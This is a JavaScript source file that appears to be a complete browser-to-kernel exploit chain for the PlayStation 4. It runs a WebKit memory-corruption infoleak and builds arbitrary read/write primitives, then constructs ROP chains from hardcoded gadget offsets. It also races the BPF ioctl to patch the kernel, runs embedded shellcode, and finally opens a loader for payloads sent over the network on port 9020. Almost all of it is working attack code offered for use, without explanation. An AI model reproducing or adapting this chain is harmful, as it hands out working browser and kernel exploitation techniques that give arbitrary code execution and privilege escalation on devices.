var p;
var s = {};
var g = {};
var gc = {
   "pop_r8": 96709,
   "pop_r9": 12268047,
   "pop_rax": 17397,
   "pop_rcx": 339545,
   "pop_rdx": 1826852,
   "pop_rsi": 586634,
   "pop_rdi": 232890,
   "pop_rsp": 124551,
   "jmp_rax": 130,
   "jmp_rdi": 2711166,
   "mov_rdx_rax": 3488561,
   "mov_rdi_rax": 22692143,
   "mov_rax_rdx": 1896224,
   "mov_rbp_rsp": 985418,
   "mov__rdi__rax": 3857131,
   "mov__rdi__rsi": 146114,
   "mov__rax__rsi": 2451047,
   "mov_rax__rax__": 444474,
   "mov_rax__rdi__": 290553,
   "add_rax_rsi": 1384646,
   "and_rax_rsi": 22481823,
   "add_rdi_rax": 5593055,
   "jop": 800720,
   "ret": 60,
   "stack_chk_fail": 200,
   "setjmp": 5368
};
window.onerror = function(e) {
   if (e.startsWith("Error:") == true) {
      alert(e);
   } else {
      location.reload();
   }
};

var rop = function() {
   this.stack = new Uint32Array(65536);
   this.stackBase = p.read8(p.leakval(this.stack).add32(16));
   this.count = 0;
   this.clear = function() {
      this.count = 0;
      this.runtime = undefined;
      for (var i = 0; i < 4080 / 2; i++) {
         p.write8(this.stackBase.add32(i * 8), 0);
      }
   };
   this.pushSymbolic = function() {
      this.count++;
      return this.count - 1;
   };
   this.finalizeSymbolic = function(idx, val) {
      p.write8(this.stackBase.add32(idx * 8), val);
   };
   this.push = function(val) {
      this.finalizeSymbolic(this.pushSymbolic(), val);
   };
   this.push_write8 = function(where, what) {
      this.push(g.pop_rdi);
      this.push(where);
      this.push(g.pop_rsi);
      this.push(what);
      this.push(g.mov__rdi__rsi);
   };
   this.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
      if (rdi != undefined) {
         this.push(g.pop_rdi);
         this.push(rdi);
      }
      if (rsi != undefined) {
         this.push(g.pop_rsi);
         this.push(rsi);
      }
      if (rdx != undefined) {
         this.push(g.pop_rdx);
         this.push(rdx);
      }
      if (rcx != undefined) {
         this.push(g.pop_rcx);
         this.push(rcx);
      }
      if (r8 != undefined) {
         this.push(g.pop_r8);
         this.push(r8);
      }
      if (r9 != undefined) {
         this.push(g.pop_r9);
         this.push(r9);
      }
      this.push(rip);
      return this;
   };
   this.run = function() {
      var retv = p.loadchain(this, this.notimes);
      this.clear();
      return retv;
   };
   return this;
};

function makeid() {
   var text = "";
   var possible = "ABCDFGHIJKMNOPQRSTUVWXYZLEefulabcdghijkmnopqrstvwxyz0123456789";
   for (var i = 0; i < 8; i++) {
      text += possible.charAt(Math.floor(Math.random() * possible.length));
   }
   return text;
}
var instancespr = [];
for (var i = 0; i < 4096; i++) {
   instancespr[i] = new Uint32Array(1);
   instancespr[i][makeid()] = 50057;
}
var _dview;

function u2d(low, hi) {
   if (!_dview) _dview = new DataView(new ArrayBuffer(16));
   _dview.setUint32(0, hi);
   _dview.setUint32(4, low);
   return _dview.getFloat64(0);
}

function zeroFill(number, width) {
   width -= number.toString().length;
   if (width > 0) {
      return new Array(width + (/\./.test(number) ? 2 : 1)).join("0") + number;
   }
   return number + "";
}

function int64(low, hi) {
   this.low = (low >>> 0);
   this.hi = (hi >>> 0);
   this.add32 = function(val) {
      var new_lo = (((this.low >>> 0) + val) & 4294967295) >>> 0;
      var new_hi = (this.hi >>> 0);
      if (new_lo < this.low) {
         new_hi++;
      }
      return new int64(new_lo, new_hi);
   };
   this.add32inplace = function(val) {
      var new_lo = (((this.low >>> 0) + val) & 4294967295) >>> 0;
      var new_hi = (this.hi >>> 0);
      if (new_lo < this.low) {
         new_hi++;
      }
      this.hi = new_hi;
      this.low = new_lo;
   };
   this.sub32 = function(val) {
      var new_lo = (((this.low >>> 0) - val) & 4294967295) >>> 0;
      var new_hi = (this.hi >>> 0);
      if (new_lo > (this.low) & 4294967295) {
         new_hi--;
      }
      return new int64(new_lo, new_hi);
   };
   this.sub32inplace = function(val) {
      var new_lo = (((this.low >>> 0) - val) & 4294967295) >>> 0;
      var new_hi = (this.hi >>> 0);
      if (new_lo > (this.low) & 4294967295) {
         new_hi--;
      }
      this.hi = new_hi;
      this.low = new_lo;
   };
   this.toString = function(val) {
      val = 16;
      var lo_str = (this.low >>> 0).toString(val);
      var hi_str = (this.hi >>> 0).toString(val);
      if (this.hi == 0) return lo_str;
      else {
         lo_str = zeroFill(lo_str, 8);
      }
      return hi_str + lo_str;
   };
   return this;
}
var nogc = [];
var tgt = {
   a: 0,
   b: 0,
   c: 0,
   d: 0
};
var y = new ImageData(1, 16384);
postMessage("", "*", [y.data.buffer]);
var props = {};
for (var i = 0; i < 16384 / 2;) {
   props[i++] = {
      value: 1111638594
   };
   props[i++] = {
      value: tgt
   };
}
var foundLeak = undefined;
var foundIndex = 0;
var maxCount = 256;
while (foundLeak == undefined && maxCount > 0) {
   maxCount--;
   history.pushState(y, "");
   Object.defineProperties({}, props);
   var leak = new Uint32Array(history.state.data.buffer);
   for (var i = 0; i < leak.length - 6; i++) {
      if (leak[i] == 1111638594 && leak[i + 1] == 4294901760 && leak[i + 2] == 0 && leak[i + 3] == 0 && leak[i + 4] == 0 && leak[i + 5] == 0 && leak[i + 6] == 14 && leak[i + 7] == 0 && leak[i + 10] == 0 && leak[i + 11] == 0 && leak[i + 12] == 0 && leak[i + 13] == 0 && leak[i + 14] == 14 && leak[i + 15] == 0) {
         foundIndex = i;
         foundLeak = leak;
         break;
      }
   }
}
if (!foundLeak) {
   throw new Error("infoleak fail");
}
Array.prototype.__defineGetter__(100, () => 1);
var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 64);
var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
var f = document.body.appendChild(document.createElement("iframe"));
var a = new f.contentWindow.Array(13.37, 13.37);
var b = new f.contentWindow.Array(u2d(leakJSVal.low + 16, leakJSVal.hi), 13.37);
var master = new Uint32Array(4096);
var slave = new Uint32Array(4096);
var leakval_u32 = new Uint32Array(4096);
var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
tgt.a = u2d(2048, 23077632);
tgt.b = 0;
tgt.c = leakval_helper;
tgt.d = 4919;
var c = Array.prototype.concat.call(a, b);
document.body.removeChild(f);
var hax = c[0];
c[0] = 0;
tgt.c = c;
hax[2] = 0;
hax[3] = 0;
Object.defineProperty(Array.prototype, 100, {
   get: undefined
});
tgt.c = leakval_helper;
var butterfly = new int64(hax[2], hax[3]);
butterfly.low += 16;
tgt.c = leakval_u32;
var lkv_u32_old = new int64(hax[4], hax[5]);
hax[4] = butterfly.low;
hax[5] = butterfly.hi;
tgt.c = master;
hax[4] = leakval_u32[0];
hax[5] = leakval_u32[1];
var a2sb = new int64(master[4], master[5]);
tgt.c = leakval_u32;
hax[4] = lkv_u32_old.low;
hax[5] = lkv_u32_old.hi;
tgt.c = 0;
hax = 0;
var p = {
   write8: function(addr, val) {
      master[4] = addr.low;
      master[5] = addr.hi;
      if (val instanceof int64) {
         slave[0] = val.low;
         slave[1] = val.hi;
      } else {
         slave[0] = val;
         slave[1] = 0;
      }
      master[4] = a2sb.low;
      master[5] = a2sb.hi;
   },
   write4: function(addr, val) {
      master[4] = addr.low;
      master[5] = addr.hi;
      slave[0] = val;
      master[4] = a2sb.low;
      master[5] = a2sb.hi;
   },
   read8: function(addr) {
      master[4] = addr.low;
      master[5] = addr.hi;
      var rtv = new int64(slave[0], slave[1]);
      master[4] = a2sb.low;
      master[5] = a2sb.hi;
      return rtv;
   },
   read4: function(addr) {
      master[4] = addr.low;
      master[5] = addr.hi;
      var rtv = slave[0];
      master[4] = a2sb.low;
      master[5] = a2sb.hi;
      return rtv;
   },
   leakval: function(jsval) {
      leakval_helper[0] = jsval;
      var rtv = this.read8(butterfly);
      this.write8(butterfly, new int64(1094795585, 4294901760));
      return rtv;
   }
};
var get_jmptgt = function(addr) {
   var z = p.read4(addr) & 65535;
   var y = p.read4(addr.add32(2));
   if (z != 9727) return 0;
   return addr.add32(y + 6);
};
var exploit = function() {
   p.leakfunc = function(func) {
      var fptr_store = p.leakval(func);
      return (p.read8(fptr_store.add32(24))).add32(64);
   };
   var parseFloatStore = p.leakfunc(parseFloat);
   var webKitBase = p.read8(parseFloatStore);
   webKitBase.low &= 4294963200;
   webKitBase.sub32inplace(5881856 - 147456);
   var o2wk = function(o) {
      return webKitBase.add32(o);
   };
   for (var gn in gc) {
      if (gc.hasOwnProperty(gn)) {
         g[gn] = o2wk(gc[gn]);
      }
   }
   var libKernelBase = p.read8(get_jmptgt(g.stack_chk_fail));
   libKernelBase.low &= 4294963200;
   libKernelBase.sub32inplace(53248 + 16384);
   var wkview = new Uint8Array(4096);
   var wkstr = p.leakval(wkview).add32(16);
   p.write8(wkstr, webKitBase);
   p.write4(wkstr.add32(8), 57131008);
   var hold1;
   var hold2;
   var holdz;
   var holdz1;
   while (1) {
      hold1 = {
         a: 0,
         b: 0,
         c: 0,
         d: 0
      };
      hold2 = {
         a: 0,
         b: 0,
         c: 0,
         d: 0
      };
      holdz1 = p.leakval(hold2);
      holdz = p.leakval(hold1);
      if (holdz.low - 48 == holdz1.low) break;
   }
   var pushframe = [];
   pushframe.length = 128;
   var funcbuf;
   var funcbuf32 = new Uint32Array(256);
   nogc.push(funcbuf32);
   var launch_chain = function(chain) {
      var stackPointer = 0;
      var stackCookie = 0;
      var orig_reenter_rip = 0;
      var reenter_help = {
         length: {
            valueOf: function() {
               orig_reenter_rip = p.read8(stackPointer);
               stackCookie = p.read8(stackPointer.add32(8));
               var returnToFrame = stackPointer;
               var ocnt = chain.count;
               chain.push_write8(stackPointer, orig_reenter_rip);
               chain.push_write8(stackPointer.add32(8), stackCookie);
               if (chain.runtime) returnToFrame = chain.runtime(stackPointer);
               chain.push(g.pop_rsp);
               chain.push(returnToFrame);
               chain.count = ocnt;
               p.write8(stackPointer, (g.pop_rsp));
               p.write8(stackPointer.add32(8), chain.stackBase);
            }
         }
      };
      funcbuf = p.read8(p.leakval(funcbuf32).add32(16));
      p.write8(funcbuf.add32(48), g.setjmp);
      p.write8(funcbuf.add32(128), g.jop);
      p.write8(funcbuf, funcbuf);
      p.write8(parseFloatStore, g.jop);
      var orig_hold = p.read8(holdz1);
      var orig_hold48 = p.read8(holdz1.add32(72));
      p.write8(holdz1, funcbuf.add32(80));
      p.write8(holdz1.add32(72), funcbuf);
      parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
      p.write8(holdz1, orig_hold);
      p.write8(holdz1.add32(72), orig_hold48);
      stackPointer = p.read8(funcbuf.add32(16));
      rtv = Array.prototype.splice.apply(reenter_help);
      return p.leakval(rtv);
   };
   p.loadchain = launch_chain;
   var kview = new Uint8Array(4096);
   var kstr = p.leakval(kview).add32(16);
   p.write8(kstr, libKernelBase);
   p.write4(kstr.add32(8), 262144);
   var countbytes;
   for (var i = 0; i < 262144; i++) {
      if (kview[i] == 114 && kview[i + 1] == 100 && kview[i + 2] == 108 && kview[i + 3] == 111 && kview[i + 4] == 99) {
         countbytes = i;
         break;
      }
   }
   p.write4(kstr.add32(8), countbytes + 32);
   var dview32 = new Uint32Array(1);
   var dview8 = new Uint8Array(dview32.buffer);
   for (var i = 0; i < countbytes; i++) {
      if (kview[i] == 72 && kview[i + 1] == 199 && kview[i + 2] == 192 && kview[i + 7] == 73 && kview[i + 8] == 137 && kview[i + 9] == 202 && kview[i + 10] == 15 && kview[i + 11] == 5) {
         dview8[0] = kview[i + 3];
         dview8[1] = kview[i + 4];
         dview8[2] = kview[i + 5];
         dview8[3] = kview[i + 6];
         var syscallno = dview32[0];
         s[syscallno] = libKernelBase.add32(i);
      }
   }
   var chain = new rop();
   var returnvalue;
   p.fcall_ = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
      chain.clear();
      chain.notimes = this.next_notime;
      this.next_notime = 1;
      chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
      chain.push(g.pop_rdi);
      chain.push(chain.stackBase.add32(16376));
      chain.push(g.mov__rdi__rax);
      chain.push(g.pop_rax);
      chain.push(p.leakval(1094795842));
      if (chain.run().low != 1094795842) {
         throw new Error("unexpected rop behaviour");
      }
      returnvalue = p.read8(chain.stackBase.add32(16376));
   };
   p.fcall = function() {
      p.fcall_.apply(this, arguments);
      return returnvalue;
   };
   p.readstr = function(addr) {
      var addr_ = addr.add32(0);
      var rd = p.read4(addr_);
      var buf = "";
      while (rd & 255) {
         buf += String.fromCharCode(rd & 255);
         addr_.add32inplace(1);
         rd = p.read4(addr_);
      }
      return buf;
   };
   p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
      if (typeof sysc != "number") {
         throw new Error("invalid syscall");
      }
      var off = s[sysc];
      if (off == undefined) {
         throw new Error("invalid syscall");
      }
      return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
   };
   p.sptr = function(str) {
      var bufView = new Uint8Array(str.length + 1);
      for (var i = 0; i < str.length; i++) {
         bufView[i] = str.charCodeAt(i) & 255;
      }
      nogc.push(bufView);
      return p.read8(p.leakval(bufView).add32(16));
   };
   p.malloc = function(sz) {
      var backing = new Uint8Array(65536 + sz);
      nogc.push(backing);
      var ptr = p.read8(p.leakval(backing).add32(16));
      ptr.backing = backing;
      return ptr;
   };
   p.stringify = function(str) {
      var bufView = new Uint8Array(str.length + 1);
      for (var i = 0; i < str.length; i++) {
         bufView[i] = str.charCodeAt(i) & 0xFF;
      }
      window.nogc.push(bufView);
      return p.read8(p.leakval(bufView).add32(0x10));
   };
   p.malloc32 = function(sz) {
      var backing = new Uint8Array(65536 + sz * 4);
      nogc.push(backing);
      var ptr = p.read8(p.leakval(backing).add32(16));
      ptr.backing = new Uint32Array(backing.buffer);
      return ptr;
   };
   var test = p.syscall(23, 0);
   if (test != "0") {
      var fd = p.syscall(5, p.sptr("/dev/bpf0"), 2).low;
      var fd1 = p.syscall(5, p.sptr("/dev/bpf0"), 2).low;
      if (fd == (-1 >>> 0)) {
         throw new Error("open bpf fail");
      }
      var bpf_valid = p.malloc32(16384);
      var bpf_spray = p.malloc32(16384);
      var bpf_valid_u32 = bpf_valid.backing;
      var bpf_valid_prog = p.malloc(64);
      p.write8(bpf_valid_prog, 2048 / 8);
      p.write8(bpf_valid_prog.add32(8), bpf_valid);
      var bpf_spray_prog = p.malloc(64);
      p.write8(bpf_spray_prog, 2048 / 8);
      p.write8(bpf_spray_prog.add32(8), bpf_spray);
      for (var i = 0; i < 1024;) {
         bpf_valid_u32[i++] = 6;
         bpf_valid_u32[i++] = 0;
      }
      var rtv = p.syscall(54, fd, 2148549243, bpf_valid_prog);
      if (rtv.low != 0) {
         throw new Error("ioctl bpf fail");
      }
      var spawnthread = function(name, chain) {
         var longjmp = webKitBase.add32(5352);
         var createThread = webKitBase.add32(7836560);
         var contextp = p.malloc32(8192);
         var contextz = contextp.backing;
         contextz[0] = 1337;
         var thread2 = new rop();
         thread2.push(g.ret);
         thread2.push(g.ret);
         thread2.push(g.ret);
         thread2.push(g.ret);
         chain(thread2);
         p.write8(contextp, g.ret);
         p.write8(contextp.add32(16), thread2.stackBase);
         p.syscall(324, 1);
         var retv = function() {
            p.fcall(createThread, longjmp, contextp, p.sptr(name));
         };
         nogc.push(contextp);
         nogc.push(thread2);
         return retv;
      };
      var interrupt1, loop1;
      var sock = p.syscall(97, 2, 2);
      var kscratch = p.malloc32(4096);
      var start1 = spawnthread("GottaGoFast", function(thread2) {
         interrupt1 = thread2.stackBase;
         thread2.push(g.ret);
         thread2.push(g.ret);
         thread2.push(g.ret);
         thread2.push(g.pop_rdi);
         thread2.push(fd);
         thread2.push(g.pop_rsi);
         thread2.push(2148549243);
         thread2.push(g.pop_rdx);
         thread2.push(bpf_valid_prog);
         thread2.push(g.pop_rsp);
         thread2.push(thread2.stackBase.add32(2048));
         thread2.count = 256;
         var cntr = thread2.count;
         thread2.push(s[54]);
         thread2.push_write8(thread2.stackBase.add32(cntr * 8), s[54]);
         thread2.push(g.pop_rdi);
         var wherep = thread2.pushSymbolic();
         thread2.push(g.pop_rsi);
         var whatp = thread2.pushSymbolic();
         thread2.push(g.mov__rdi__rsi);
         thread2.push(g.pop_rsp);
         loop1 = thread2.stackBase.add32(thread2.count * 8);
         thread2.push(1094795585);
         thread2.finalizeSymbolic(wherep, loop1);
         thread2.finalizeSymbolic(whatp, loop1.sub32(8));
      });
      var krop = new rop();
      var race = new rop();
      var ctxp = p.malloc32(8192);
      var ctxp1 = p.malloc32(8192);
      var ctxp2 = p.malloc32(8192);
      p.write8(bpf_spray.add32(16), ctxp);
      p.write8(ctxp.add32(80), 0);
      p.write8(ctxp.add32(104), ctxp1);
      var stackshift_from_retaddr = 0;
      p.write8(ctxp1.add32(16), o2wk(19536333));
      stackshift_from_retaddr += 8 + 88;
      p.write8(ctxp.add32(0), ctxp2);
      p.write8(ctxp.add32(16), ctxp2.add32(8));
      p.write8(ctxp2.add32(2000), o2wk(7271653));
      var iterbase = ctxp2;
      for (var i = 0; i < 15; i++) {
         p.write8(iterbase, o2wk(19536333));
         stackshift_from_retaddr += 8 + 88;
         p.write8(iterbase.add32(2000 + 32), o2wk(7271653));
         p.write8(iterbase.add32(8), iterbase.add32(32));
         p.write8(iterbase.add32(24), iterbase.add32(32 + 8));
         iterbase = iterbase.add32(32);
      }
      var raxbase = iterbase;
      var rdibase = iterbase.add32(8);
      var memcpy = get_jmptgt(webKitBase.add32(248));
      memcpy = p.read8(memcpy);
      p.write8(raxbase, o2wk(22848539));
      stackshift_from_retaddr += 8;
      p.write8(rdibase.add32(112), o2wk(19417140));
      stackshift_from_retaddr += 8;
      p.write8(rdibase.add32(24), rdibase);
      p.write8(rdibase.add32(8), krop.stackBase);
      p.write8(raxbase.add32(48), g.mov_rbp_rsp);
      p.write8(rdibase, raxbase);
      p.write8(raxbase.add32(1056), o2wk(2566497));
      p.write8(raxbase.add32(64), memcpy.add32(194 - 144));
      var topofchain = stackshift_from_retaddr + 40;
      p.write8(rdibase.add32(176), topofchain);
      for (var i = 0; i < 4096 / 8; i++) {
         p.write8(krop.stackBase.add32(i * 8), g.ret);
      }
      krop.count = 16;
      var kpatch = function(offset, qword) {
         krop.push(g.pop_rax);
         krop.push(kscratch);
         krop.push(g.mov_rax__rax__);
         krop.push(g.pop_rsi);
         krop.push(offset);
         krop.push(g.add_rax_rsi);
         krop.push(g.pop_rsi);
         krop.push(qword);
         krop.push(g.mov__rax__rsi);
      };
      var kpatch2 = function(offset, offset2) {
         krop.push(g.pop_rax);
         krop.push(kscratch);
         krop.push(g.mov_rax__rax__);
         krop.push(g.pop_rsi);
         krop.push(offset);
         krop.push(g.add_rax_rsi);
         krop.push(g.mov_rdi_rax);
         krop.push(g.pop_rax);
         krop.push(kscratch);
         krop.push(g.mov_rax__rax__);
         krop.push(g.pop_rsi);
         krop.push(offset2);
         krop.push(g.add_rax_rsi);
         krop.push(g.mov__rdi__rax);
      };
      p.write8(kscratch.add32(1056), g.pop_rdi);
      p.write8(kscratch.add32(64), g.pop_rax);
      p.write8(kscratch.add32(24), kscratch);
      krop.push(g.pop_rdi);
      krop.push(kscratch.add32(24));
      krop.push(g.mov_rbp_rsp);
      var rboff = topofchain - krop.count * 8 + 40;
      krop.push(o2wk(2566497));
      krop.push(g.pop_rax);
      krop.push(rboff);
      krop.push(g.add_rdi_rax);
      krop.push(g.mov_rax__rdi__);
      krop.push(g.pop_rsi);
      krop.push(762);
      krop.push(g.add_rax_rsi);
      krop.push(g.mov__rdi__rax);
      var shellbuf = p.malloc32(4096);
      krop.push(g.pop_rdi);
      krop.push(kscratch);
      krop.push(g.mov__rdi__rax);
      krop.push(g.pop_rsi);
      krop.push(808116);
      krop.push(g.add_rax_rsi);
      krop.push(g.pop_rdi);
      krop.push(kscratch.add32(8));
      krop.push(g.mov__rdi__rax);
      krop.push(g.jmp_rax);
      krop.push(g.pop_rdi);
      krop.push(kscratch.add32(16));
      krop.push(g.mov__rdi__rax);
      krop.push(g.pop_rsi);
      krop.push(new int64(4294901759, 4294967295));
      krop.push(g.and_rax_rsi);
      krop.push(g.mov_rdx_rax);
      krop.push(g.pop_rax);
      krop.push(kscratch.add32(8));
      krop.push(g.mov_rax__rax__);
      krop.push(g.pop_rsi);
      krop.push(9);
      krop.push(g.add_rax_rsi);
      krop.push(g.mov_rdi_rax);
      krop.push(g.mov_rax_rdx);
      krop.push(g.jmp_rdi);
      krop.push(g.pop_rax);
      krop.push(kscratch);
      krop.push(g.mov_rax__rax__);
      krop.push(g.pop_rsi);
      krop.push(221338);
      krop.push(g.add_rax_rsi);
      krop.push(g.mov_rax__rax__);
      krop.push(g.pop_rdi);
      krop.push(kscratch.add32(816));
      krop.push(g.mov__rdi__rax);
      kpatch(221338, new int64(2425420344, 2425393296));
      kpatch(20169540, shellbuf);
      kpatch(new int64(4293816070, 4294967295), new int64(184, 3297329408));
      kpatch(new int64(4293470503, 4294967295), new int64(0, 1082624841));
      kpatch(new int64(4293470533, 4294967295), new int64(2425388523, 1922076816));
      kpatch(new int64(4294769332, 4294967295), new int64(934690871, 826654769));
      kpatch(828366, new int64(233, 2336788480));
      kpatch(1329844, new int64(2428747825, 2425393296));
      kpatch(new int64(15789236, 0), new int64(2, 0));
      kpatch2(new int64(15789244, 0), new int64(4293548276, 4294967295));
      kpatch(new int64(15789276, 0), new int64(0, 1));
      krop.push(g.pop_rax);
      krop.push(kscratch.add32(8));
      krop.push(g.mov_rax__rax__);
      krop.push(g.pop_rsi);
      krop.push(9);
      krop.push(g.add_rax_rsi);
      krop.push(g.mov_rdi_rax);
      krop.push(g.pop_rax);
      krop.push(kscratch.add32(16));
      krop.push(g.mov_rax__rax__);
      krop.push(g.jmp_rdi);
      krop.push(o2wk(380345));
      krop.push(kscratch.add32(4096));
      var kq = p.malloc32(16);
      var kev = p.malloc32(256);
      kev.backing[0] = sock;
      kev.backing[2] = 131071;
      kev.backing[3] = 1;
      kev.backing[4] = 5;
      var shcode = [35817, 2425393152, 2425393296, 2425393296, 8567125, 2303246336, 1096172005, 1398030677, 2303275535, 3149957588, 256, 551862601, 1220806985, 9831821, 2370371584, 4265616532, 2370699263, 3767542964, 2370633744, 1585456300, 2169045059, 1265721540, 277432321, 4202255, 698, 3867757568, 524479, 3607052544, 960335176, 1207959552, 3224487561, 2211839809, 3698655723, 1103114587, 1096630620, 2428722526, 1032669269, 4294967160, 2303260209, 15293925, 1207959552, 770247, 2303262720, 3271888842, 1818324331, 979595116, 628633632, 1815490864, 2648, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
      for (var i = 0; i < shcode.length; i++) {
         shellbuf.backing[i] = shcode[i];
      }
      start1();
      while (1) {
         race.count = 0;
         race.push(s[362]);
         race.push(g.pop_rdi);
         race.push(kq);
         race.push(g.mov__rdi__rax);
         race.push(g.ret);
         race.push(g.ret);
         race.push(g.ret);
         race.push(g.ret);
         race.push_write8(loop1, interrupt1);
         race.push(g.pop_rdi);
         race.push(fd);
         race.push(g.pop_rsi);
         race.push(2148549243);
         race.push(g.pop_rdx);
         race.push(bpf_valid_prog);
         race.push(s[54]);
         race.push(g.pop_rax);
         race.push(kq);
         race.push(g.mov_rax__rax__);
         race.push(g.mov_rdi_rax);
         race.push(g.pop_rsi);
         race.push(kev);
         race.push(g.pop_rdx);
         race.push(1);
         race.push(g.pop_rcx);
         race.push(0);
         race.push(g.pop_r8);
         race.push(0);
         race.push(s[363]);
         race.push(g.pop_rdi);
         race.push(fd1);
         race.push(g.pop_rsi);
         race.push(2148549243);
         race.push(g.pop_rdx);
         race.push(bpf_spray_prog);
         race.push(s[54]);
         race.push(g.pop_rax);
         race.push(kq);
         race.push(g.mov_rax__rax__);
         race.push(g.mov_rdi_rax);
         race.push(s[6]);
         race.run();
         if (kscratch.backing[0] != 0) {
            p.syscall(74, shellbuf, 16384, 7);
            p.fcall(shellbuf);
            break;
         }
      }
   }
   var code_addr = new int64(0x26100000, 0x00000009);
   var buffer = p.syscall(477, code_addr, 0x300000, 7, 0x41000, -1, 0);
   if (buffer == '926100000') {
      try {
         var createThread = webKitBase.add32(7836560);
         var shellbuf = p.malloc32(0x1000);
         var shcode = [838764872, 1032538304, 16372, 3977087816, 1207959615, 2868115753, 3908536648, 96, 1220788273, 245959, 2303262720, 3271888842, 113297224, 1224736768, 84920969, 3234285763, 30, 264931657, 3343434501, 25024, 3397994752, 1220740367, 6865095, 2303262720, 3271888842, 1791018824, 1224736768, 84920969, 2425393347, 2425393296, 2425393296, 2425393296, 3092599873, 15395, 3201446227, 1, 703, 3968026624, 604292624, 608486928, 1153892865, 1060, 2305163264, 3322029124, 533572, 153371846, 608486912, 1153826826, 3321891620, 795716, 220480710, 4286113792, 280690687, 1090519040, 2303247497, 3905391078, 4294967155, 2750, 3884532736, 4294931432, 835858943, 3884532982, 4294918376, 1220905471, 536871096, 2342, 3271607808, 3955460424, 2149519116, 0, 21534792, 268483267, 2303197184, 3908012510, 4294967031, 3900686469, 3907488068, 4294967032, 4058574729, 1224736766, 536871096, 2342, 1221656320, 1527825539, 3277603165, 3284386755];
         for (var i = 0; i < shcode.length; i++) {
            shellbuf.backing[i] = shcode[i];
         }
         p.syscall(74, shellbuf, 0x4000, 7);
      } catch (e) {
         alert(e);
      }
   }
   p.fcall(createThread, shellbuf, 0, p.stringify(name));
   alert("Waiting for Payload... Send it using the PS4 IP and port 9020");
   msgs2.innerHTML="<h1 style='font-size:30px;'>Bin Loader Launched ✔</h1>";
};
window.onload = function() {
   setTimeout(exploit, 1000);
};